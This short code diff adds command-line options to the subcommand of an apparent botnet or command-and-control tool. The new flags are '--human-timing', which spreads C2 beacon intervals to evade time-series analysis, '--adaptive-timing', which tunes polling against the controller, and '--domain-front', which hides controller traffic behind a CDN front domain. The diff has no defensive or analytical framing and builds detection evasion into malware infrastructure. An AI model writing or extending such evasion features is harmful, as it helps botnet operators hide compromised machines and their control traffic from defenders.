@@ -846,6 +846,12 @@ def build_parser() -> argparse.ArgumentParser:
     p_net.add_argument("--db", default=None, help="SQLite database path")
     p_net.add_argument("--skip-vpn-check", action="store_true")
     p_net.add_argument("--vault-passphrase", default=None, help="encrypt credentials at rest with AES-256-GCM")
+    p_net.add_argument("--human-timing", action="store_true",
+                       help="spread C2 intervals across business/evening/night (evades time-series analysis)")
+    p_net.add_argument("--adaptive-timing", action="store_true",
+                       help="adjust poll interval based on controller RTT (exponential backoff on failures)")
+    p_net.add_argument("--domain-front", default=None,
+                       help="CDN front domain for domain fronting (SNI=front, Host=controller)")
     p_net.add_argument("--json", action="store_true")
     p_net.set_defaults(func=_cmd_botnet)
 
